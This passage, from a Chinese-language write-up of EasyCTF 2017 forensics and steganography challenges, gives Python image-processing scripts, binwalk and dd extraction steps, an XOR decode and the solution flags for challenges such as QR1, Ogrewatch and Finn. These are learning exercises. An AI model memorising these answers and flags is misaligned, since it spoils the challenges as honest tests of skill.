<pre><code><p>from PIL import Image</p><p>from PIL import ImageEnhance</p><p>def invert(im):</p><p>&nbsp; &nbsp; im = im.convert("L")</p><p>&nbsp; &nbsp; pixel = im.load()</p><p>&nbsp; &nbsp; width = im.size[0]</p><p>&nbsp; &nbsp; height = im.size[1]</p><p>&nbsp; &nbsp; for x in range(width):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for y in range(height):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pixel[x, y] = 255 - pixel[x, y]</p><p>&nbsp; &nbsp; return im</p><p>def enhance(im):</p><p>&nbsp; &nbsp; im = ImageEnhance.Contrast(im).enhance(10.0)</p><p>&nbsp; &nbsp; return im</p><p>def fill(im):</p><p>&nbsp; &nbsp; im = im.convert("L")</p><p>&nbsp; &nbsp; pixel = im.load()</p><p>&nbsp; &nbsp; width = im.size[0]</p><p>&nbsp; &nbsp; height = im.size[1]</p><p>&nbsp; &nbsp; for x in range(width):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if((pixel[x, 0] != 255) or (pixel[x, 21] != 255) or (pixel[x, 43] != 255)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for y in range(height):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pixel[x, y] = 0</p><p>&nbsp; &nbsp; return im</p><p>def main():</p><p>&nbsp; &nbsp; im = Image.open('cea3386a382bfad628a3c5edf8d61a9285ab0290_gibberish.png')</p><p>&nbsp; &nbsp; pixel = im.load()</p><p>&nbsp; &nbsp; channels = ['r', 'g', 'b']</p><p>&nbsp; &nbsp; i = 0</p><p>&nbsp; &nbsp; for im_channel in im.split():</p><p>&nbsp; &nbsp; &nbsp; &nbsp; im_invert = invert(im_channel)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; im_enhance = enhance(im_invert)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; im_fill = fill(im_enhance)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; im_fill.save('im_' + channels[i] +'.png')</p><p>&nbsp; &nbsp; &nbsp; &nbsp; i += 1</p><p>if __name__ == '__main__':</p><p>&nbsp; &nbsp; main()</p></code></pre>
</p>
<p>处理后分别得到</p>
<p>R通道图像</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907756475315.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907756475315.png!small" alt=""></p></noscript>
<p><span style="font-size: 16px;">G通道图像</span></p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907756524064.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907756524064.png!small" alt=""></p></noscript>
<p><span style="font-size: 16px;">B通道图像</span></p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907756582540.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907756582540.png!small" alt=""></p></noscript>
<p>处理后G通道最有可能是条形码多次扫描终于<a href="http://www.coolapk.com/apk/com.google.zxing.client.android">条码扫描器Barcode Scanner</a></p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907756662244.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907756662244.jpg!small" alt=""></p></noscript>
<p>得到8个字符:LH5i6uQz</p>
<p>那其他两张图像怎么处理呢提示说任何事物都是简单的二进制开脑洞想到可能是黑白颜色代表二进制的10于是提取图像的首行像素转换二进制串再转换为字符串</p>
</p>
<pre><code><p>from PIL import Image</p><p>import libnum</p><p>im_b = Image.open('im_b.png')</p><p>im_r = Image.open('im_r.png')</p><p>def image2ascii(im):</p><p>&nbsp; &nbsp; im = im.convert("L")</p><p>&nbsp; &nbsp; pixel = im.load()</p><p>&nbsp; &nbsp; width = im.size[0]</p><p>&nbsp; &nbsp; bits = ""</p><p>&nbsp; &nbsp; for x in range(width):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if(pixel[x, 0] == 255):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; bits += "0"</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; bits += "1"</p><p>&nbsp; &nbsp; print(libnum.b2s(bits))</p><p>def main():</p><p>&nbsp; &nbsp; image2ascii(im_r)</p><p>&nbsp; &nbsp; image2ascii(im_b)</p><p>if __name__ == '__main__':</p><p>&nbsp; &nbsp; main()</p></code></pre>
</p>
<p>也是得到了两组8个字符</p>
</p>
<pre><code><p>aPgMasSt</p><p>5U5EYz2b</p></code></pre>
</p>
<p>一开始以为三个部分组合可能是base64但是怎么组合都不对陷入江局又看了N遍题目说我的flag永远不会过期GG搜索N久才发现说的是pastebin。程序员的世界你不懂他们已经占领了 github但我们还有 PasteBin。</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/1490775681142.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/1490775681142.png!small" alt=""></p></noscript>
<p>而你分享的内容会自动生成一个8字符的链接这脑洞也是服最后得到网址</p>
<blockquote><ul>
<li><a href="http://pastebin.com/LH5i6uQz">http://pastebin.com/LH5i6uQz</a></li>
<li><a href="http://pastebin.com/LH5i6uQz">http://pastebin.com/aPgMasSt</a></li>
<li><a href="http://pastebin.com/LH5i6uQz">http://pastebin.com/5U5EYz2b</a></li>
</ul>
</blockquote>
<p>组合得到easyctf{col0rs_b4rcod3s_and_b1nary_f?n}激动地一提交结果不对仔细又开打链接检查才发现flag里有个问号可能是让猜测填个u试试fun终于get Orz。    </p>
<h3>QR1</h3>
<p><b>problem</b></p>
<p>I just saw this QR code the other day, but couldn&#8217;t tell what data it has. Can you help? <a href="https://raw.githubusercontent.com/EasyCTF/easyctf-2017-problems/master/qr-1/qr1.bmp" class="highslide-image" onclick="return hs.expand(this);" target="_blank">Here</a> it is.</p>
<p>Hint:Is the image only black and white?</p>
<p><b>solution</b></p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907756957032.bmp!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907756957032.bmp!small" alt=""></p></noscript>
<p>首先看到二维码的定位标识被反相处理了题目还提示了说图像只有黑色和白色吗于是推测图像可能不止黑白两种颜色于是打开PS不断锐化原图像果然发现一些接近黑色的颜色被暴露</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907757061159.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907757061159.png!small" alt=""></p></noscript>
<p>需要把接近黑色的颜色画成黑色手动画图挺麻烦还是上脚本</p>
</p>
<pre><code><p>from PIL import Image</p><p>def process(image):</p><p>&nbsp; &nbsp; pixels = image.load()</p><p>&nbsp; &nbsp; width = image.size[0]</p><p>&nbsp; &nbsp; height = image.size[1]</p><p>&nbsp; &nbsp; for x in range(width):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for y in range(height):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (pixels[x, y] != 255):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if pixels[x, y] &lt; 125:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pixels[x, y] = 0</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pixels[x, y] = 255</p><p>&nbsp; &nbsp; return image</p><p>def main():</p><p>&nbsp; &nbsp; image = Image.open('qr1.bmp')</p><p>&nbsp; &nbsp; image = image.convert('L')</p><p>&nbsp; &nbsp; processed_image = process(image)</p><p>&nbsp; &nbsp; processed_image.save('solved.bmp')</p><p>if __name__ == '__main__':</p><p>&nbsp; &nbsp; main()</p></code></pre>
</p>
<p>得到处理后的图像</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907757155218.bmp!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907757155218.bmp!small" alt=""></p></noscript>
<p>接下来对定位标识进行反相处理</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907757246148.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907757246148.png!small" alt=""></p></noscript>
</p>
<pre><code>easyctf{n0w_who-w0u1d_do_thAT_to_Th3ir_QR?}</code></pre>
</p>
<h3>Ogrewatch</h3>
<p><b>problem</b></p>
<p>My friend was out watching ogres when he heard a strange sound. Could you figure out what it means? <a href="https://github.com/EasyCTF/easyctf-2017-problems/raw/master/ogrewatch/ogreman" target="_blank">ogreman</a>HintIf you&#8217;re having trouble with the    file format, Gary Kessler might help.</p>
<p><b>solution</b></p>
</p>
<pre><code><p>root@kali:~/Desktop# file ogreman&nbsp;</p><p>ogreman: Matroska data</p></code></pre>
</p>
<p>在了解一波<a href="http://www.cnblogs.com/loleng/articles/2032722.html" target="_blank">MATROSKA 文件格式</a>给文件加上.mka后缀后使用Pot Player播放时有字幕一闪而过</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907757337557.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907757337557.png!small" alt=""></p></noscript>
<p>于是使用MATROSKA文件处理工具<a href="https://mkvtoolnix.download/downloads.html">MKVToolNix</a>中的mkvextract将字幕导出</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/1490775742778.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/1490775742778.png!small" alt=""></p></noscript>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907757531125.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907757531125.png!small" alt=""></p></noscript>
<pre><code>λ mkvextract.exe tracks 132ea90b28084ca59d251988faeecf40e4879b98_ogreman 2:zimu
</code></pre>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907757742577.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907757742577.png!small" alt=""></p></noscript>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/1490775783956.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/1490775783956.png!small" alt=""></p></noscript>
<p>将有flag的部分提取出来单独处理</p>
</p>
<pre><code><p>with open('flag.txt') as file:</p><p>&nbsp; &nbsp; lines_list = file.readlines()</p><p>&nbsp; &nbsp; flag = ""</p><p>&nbsp; &nbsp; for line in lines_list:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; flag = flag + line[50]</p><p>&nbsp; &nbsp; print(flag) # easyctf{subs_r_b3tt3r_th@n_dub5}</p></code></pre>
</p>
<h3>Flag PEG</h3>
<p><b>problem</b></p>
<p>We found a flag but it didn&#8217;t do anything. Maybe you can find a better flag?You&#8217;re not looking deep enough.</p>
<p><b>solution</b></p>
</p>
<pre><code><p>sunnyelf@ubuntu:~/Desktop$ binwalk -v heresaflag&nbsp;</p><p>Scan Time: &nbsp; &nbsp; 2017-03-26 09:29:30</p><p>Target File: &nbsp; /home/sunnyelf/Desktop/heresaflag</p><p>MD5 Checksum: &nbsp;890fad720c23e53f4698ac04bc5f9a23</p><p>Signatures: &nbsp; &nbsp;344</p><p>DECIMAL &nbsp; &nbsp; &nbsp; HEXADECIMAL &nbsp; &nbsp; DESCRIPTION</p><p>--------------------------------------------------------------------------------</p><p>0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; JPEG image data, EXIF standard</p><p>12 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;0xC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TIFF image data, big-endian, offset of first image directory: 8</p><p>18357 &nbsp; &nbsp; &nbsp; &nbsp; 0x47B5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#"&gt; &lt;rdf:Description rdf:about="" xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" xmlns:stEvt=</p><p>341939 &nbsp; &nbsp; &nbsp; &nbsp;0x537B3 &nbsp; &nbsp; &nbsp; &nbsp; 7-zip archive data, version 0.3</p></code></pre>
</p>
<pre><code><p>sunnyelf@ubuntu:~/Desktop$ dd if=heresaflag of=1.7z skip=341939 bs=1</p><p>记录了156772+0 的读入</p><p>记录了156772+0 的写出</p><p>156772 bytes (157 kB, 153 KiB) copied, 0.211627 s, 741 kB/s</p></code></pre>
</p>
<pre><code><p>sunnyelf@ubuntu:~/Desktop$ 7z e 1.7z&nbsp;</p><p>7-Zip [64] 9.20 &nbsp;Copyright (c) 1999-2010 Igor Pavlov &nbsp;2010-11-18</p><p>p7zip Version 9.20 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,1 CPU)</p><p>Processing archive: 1.7z</p><p>Extracting &nbsp;KHgrbikqKC0xKV5u</p><p>Everything is Ok</p><p>Size: &nbsp; &nbsp; &nbsp; 155553</p><p>Compressed: 156772</p></code></pre>
</p>
<pre><code><p>sunnyelf@ubuntu:~/Desktop$ python -c "import base64;print base64.b64decode('KHgrbikqKC0xKV5u')"</p><p>(x+n)*(-1)^n</p></code></pre>
</p>
<p>看到(x+n)*(-1)^n可能是加密算法而KHgrbikqKC0xKV5u文件可能就是已加密的文件先拖进Hex Editor Neo看看</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907757987805.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907757987805.png!small" alt=""></p></noscript>
<p>看到第一个字节是0&#215;89第一反应可能png的头推测该加密的文件原文件是png文件如果x表示字节内容n表示顺序的话简单地来验证一下0&#215;89 = 137137+0*(-1)^0=137果然计算结果相同那么把png文件头都使用(x+n)*(-1)^n加密再和已加密的文件对比一下呢    </p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907758064019.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907758064019.png!small" alt=""></p></noscript>
<p>结果发现规律png文件头上的偶数位字节数值从0开始数起加密计算后总是与给的文件偶数位上字节数值相等png文件头上的奇数位字节数值加密后与给的文件奇数位上的字节数值满足一种关系给的文件奇数位上的字节数值减去经过加密的数值恒等于256比如175-(-81)=256 182-(-74)=256如果y=(x+n)*(-1)^n那么x=y/(-1)^n-n 注意计算结果可能为负值所以要模256所以接下来就交给脚本</p>
</p>
<pre><code><p>decrypt_data = ''</p><p>with open('KHgrbikqKC0xKV5u', 'rb') as encrypted_file:</p><p>&nbsp; &nbsp; n = 0</p><p>&nbsp; &nbsp; while 1:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; byte = encrypted_file.read(1)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if not byte:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break</p><p>&nbsp; &nbsp; &nbsp; &nbsp; d = ord(byte)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; if n % 2 == 0:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; y = d</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x = (y / ((-1) ** n) - n) % 256</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decrypt_data += chr(x)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; else:</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; y = (d - 256)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x = (y / ((-1) ** n) - n) % 256</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; decrypt_data += chr(x)</p><p>&nbsp; &nbsp; &nbsp; &nbsp; n += 1</p><p>with open('decrypt_file.png', 'wb') as decrypt_file:</p><p>&nbsp; &nbsp; decrypt_file.write(decrypt_data)</p></code></pre>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907758152875.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907758152875.png!small" alt=""></p></noscript>
</p>
<h3>My USB</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I found my <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/my-usb/usb.img" target="_blank">usb</a> from a long time ago. I know there&#8217;s a flag on there somewhere; can you help me find it?</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>root@kali:~/Desktop# mv 2c370b79d147127064f019dcb05bba1aa917c552_usb.img usb.img</p><p>root@kali:~/Desktop# binwalk -v usb.img&nbsp;</p><p>root@kali:~/Desktop# foremost usb.img</p></code></pre>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/1490775823508.jpg!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/1490775823508.jpg!small" alt=""></p></noscript>
</p>
<h3>Finn</h3>
</p>
<p><b>problem</b></p>
</p>
<p>The Resistance intercepted this suspicious <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/finn/finn.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank">picture</a> of Finn&#8217;s old stormtrooper helmet, sent by General Hux to Kylo Ren. Hux isn&#8217;t exactly Finn&#8217;s        biggest fan. What could he be hiding? Good luck!</p>
</p>
<p>If you get stuck, We also have <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/finn/help.txt" target="_blank">this</a> blob of sarcasm, which may or may not be useful in your quest. Worth a shot right?</p>
</p>
<p>HintIn hindsight, numerical pins make really bad passwords . . . especially if they are pop culture references, also some pixels differ by more than one</p>
</p>
<pre><code><p>Everyone complains that my problems are too random. Fine. Here is EXACTLY how to solve this problem.</p><p>1\. Wow I have an image. I wonder why it’s so big (read: grandma, what large eyes you have)</p><p>2\. So I figured that part out. Great, there’s a password. I wonder what that has to do with this image. Or wait, I could just brute force it, right? Either way works. It’s called reading the problem description. Or even the title. Titles do matter.</p><p>3\. Yay, 2 images. What’s the difference? Hmmmm, I wonder what would happen if I ressed that difference pictorially.&nbsp;</p><p>4\. Well I got some stuff, but it makes no sense. Oh wait, maybe I need a key! Let’s go back to that thing we extracted earlier, shall we? Maybe those discrepancies are ACTUALLY USEFUL. Nothing is an accident, not even random out of place pixels. Check them. Carefully.</p><p>5\. What do I do with this message and key? How about, the most obvious thing in every CTF ever. Seriously.</p><p>So you got the flag. Congrats! See, it wasn’t that bad.</p></code></pre>
</p>
</p>
<p><b>solution</b></p>
</p>
<pre><code><p>root@kali:~/Desktop# file finn.jpg&nbsp;</p><p>finn.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 118x118, segment length 16, baseline, precision 8, 630x630, frames 3</p><p>root@kali:~/Desktop# binwalk -v finn.jpg&nbsp;</p><p>Scan Time: &nbsp; &nbsp; 2017-03-27 03:53:23</p><p>Target File: &nbsp; /root/Desktop/finn.jpg</p><p>MD5 Checksum: &nbsp;e09ee29407ca1b68db84dae5be8a52d4</p><p>Signatures: &nbsp; &nbsp;344</p><p>DECIMAL &nbsp; &nbsp; &nbsp; HEXADECIMAL &nbsp; &nbsp; DESCRIPTION</p><p>--------------------------------------------------------------------------------</p><p>0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0x0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; JPEG image data, JFIF standard 1.01</p><p>44350 &nbsp; &nbsp; &nbsp; &nbsp; 0xAD3E &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Zip archive data, at least v1.0 to extract, name: kylo/</p><p>44413 &nbsp; &nbsp; &nbsp; &nbsp; 0xAD7D &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Zip archive data, encrypted at least v2.0 to extract, compressed size: 3489072, uncompressed size: 3488525, name: kylo/kylo1.png</p><p>3533573 &nbsp; &nbsp; &nbsp; 0x35EB05 &nbsp; &nbsp; &nbsp; &nbsp;Zip archive data, encrypted at least v2.0 to extract, compressed size: 3489495, uncompressed size: 3488948, name: kylo/kylo2.png</p><p>7023399 &nbsp; &nbsp; &nbsp; 0x6B2B27 &nbsp; &nbsp; &nbsp; &nbsp;End of Zip archive</p><p>root@kali:~/Desktop# foremost finn.jpg&nbsp;</p><p>Processing: finn.jpg</p><p>|foundat=kylo/UT &nbsp; &nbsp;</p><p>foundat=kylo/kylo1.pngUT*|</p></code></pre>
</p>
</p>
<p>得到一个加密的zip尝试暴力破解</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907758343631.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907758343631.png!small" alt=""></p></noscript>
</p>
<p>解压得到两种表面上相似的png图片使用Stegsolve对比检测当浏览到sub模式时</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907758456687.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907758456687.png!small" alt=""></p></noscript>
</p>
<p>扫码得到26个hex值\x63\x68\x66\x63\x7e\x71\x73\x34\x76\x57\x72\x3c\x74\x73\x5c\x31\x75\x5d\x6b\x32\x34\x77\x59\x38\x4c\x7f尝试解码得到chfc~qs4vWr&lt;ts\1u]k24wY8L结果不是flag根据提示又看比较出来的二维码左下角貌似多了一些像素于是在PS中对比才发现还有一些像素stegsolve没有提取出来            </p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907758697547.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907758697547.png!small" alt=""></p></noscript>
</p>
<p><img data-original="http://image.3001.net/images/20170329/14907758783829.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907758783829.png!small" alt=""></p></noscript>
</p>
<p>刚好26个像素将它们的灰度值提取出来5,4,7,4,5,2,7,0,4,8,5,8,6,0,3,0,6,2,9,1,1,3,6,2,8,2写个脚本异或看看</p>
</p>
<pre><code><p>a = [0x63,0x68,0x66,0x63,0x7e,0x71,0x73,0x34,0x76,0x57,0x72,0x3c,0x74,0x73,0x5c,0x31,0x75,0x5d,0x6b,0x32,0x34,0x77,0x59,0x38,0x4c,0x7f]</p><p>b = [5,4,7,4,5,2,7,0,4,8,5,8,6,0,3,0,6,2,9,1,1,3,6,2,8,2]</p><p>c = []</p><p>d = ''</p><p>for x in xrange(len(a)):</p><p>&nbsp; &nbsp; c.append(a[x] ^ b[x])</p><p>for y in xrange(len(c)):</p><p>&nbsp; &nbsp; d += chr(c[y])</p><p>print(d) # flag{st4r_w4rs_1s_b35t_:D}</p></code></pre>
</p>
</p>
<h3>Serial</h3>
</p>
<p><b>problem</b></p>
</p>
<p>I was listening to <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/serial/serial.wav">this</a> haystack, but I didn&#8217;t notice anything. What did I miss?</p>
</p>
<p>hint: 010100110110010101110010011010010110000101101100001011100010111000101110</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://writeups.easyctf.com/forensics/serial-300-points.html">writeup</a></p>
</p>
<h3>Decomphose</h3>
</p>
<p><b>problem</b></p>
</p>
<p>Image arithmetic is super neat until there&#8217;s more than two images involved.</p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md">file 1</a></p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md">file 2</a></p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md">file 3</a></p>
</p>
<p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/decomphose/description.md">file 4</a></p>
</p>
<p><b>solution</b></p>
</p>
<p>给了4个压缩包分别解压一共得到48张类似这样的图片</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907758898704.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907758898704.png!small" alt=""></p></noscript>
</p>
<p>放大可以看到一些像素被周围黑色像素包围其他的图片打开放大看也是这种情况所以尝试把所有图片中被黑色像素包围的像素提取到一张图片上看看</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907758982312.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907758982312.png!small" alt=""></p></noscript>
</p>
<pre><code><p>import os</p><p>from PIL import Image</p><p>flag = Image.new("RGB", (1280, 720))</p><p>path = "E:\sunnyelf\Desktop\easyctf 2017\Forensics\Decomphose\decomp"</p><p>for file_name in os.listdir(path):</p><p>&nbsp; &nbsp; f = Image.open(path + "\\" + file_name)</p><p>&nbsp; &nbsp; width, height = f.size</p><p>&nbsp; &nbsp; for i in xrange(width):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for j in xrange(height):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add = True</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (i &gt; 0 and f.getpixel((i - 1, j)) != (0, 0, 0)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add = False</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (i &lt; width - 1 and f.getpixel((i + 1, j)) != (0, 0, 0)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add = False</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (j &gt; 0 and f.getpixel((i, j - 1)) != (0, 0, 0)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add = False</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (j &lt; height - 1 and f.getpixel((i, j + 1)) != (0, 0, 0)):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add = False</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (add):</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; flag.putpixel((i, j), f.getpixel((i, j)))</p><p>flag.save("flag.png")</p></code></pre>
</p>
</p>
<p>跑了3分钟左右看看结果</p>
</p>
<p style="text-align: center;"><img data-original="http://image.3001.net/images/20170329/14907759061123.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=""></p>
<noscript><img src="http://image.3001.net/images/20170329/14907759061123.png!small" alt=""></p></noscript>
</p>
<h3>QR2</h3>
</p>
<p><b>problem</b></p>
</p>
<p>When I am not practicing my <a href="https://en.wikipedia.org/wiki/Oboe" target="_blank">Oboe</a> for band, I have been working on a QR code generator. For some reason, some of the images are not scannable. <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/qr-2/qr2.bmp" class="highslide-image" onclick="return hs.expand(this);" target="_blank">Here</a> is one, can you tell me what it says?</p>
</p>
<p>NOTE: Due to a flag leak, this is a re-release of the problem with a new flag.</p>
</p>
<p>hint: Is there another kind of Oboe?</p>
</p>
<p><b>solution</b></p>
</p>
<p><a href="https://github.com/VoidMercy/EasyCTF-Writeups-2017/tree/master/forensics/QR2" target="_blank">writeup</a></p>
</p>
<h2>0&#215;03 Steganography</h2>
</p>
<h3>Kittycat</h3>
</p>
<p><b>problem</b></p>
</p>
<p>My <a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/kittycat/kittycat.avi" target="_blank">cats</a> are cuter than yours <img data-original="http://image.3001.net/images/index/smilies/icon_smile.gif" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt=':)' class='wp-smiley' /> hint: I used to have one cat, but now I have two.</p>
<noscript><img src='http://image.3001.net/images/index/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /> hint: I used to have one cat, but now I have two.</p></noscript>
</p>
<p><b>solution</b></p>
</p>
<p><a href="http://wenku.baidu.com/view/bbffdc4203d8ce2f006623b3" target="_blank">图像处理基本知识</a></p>
</p>
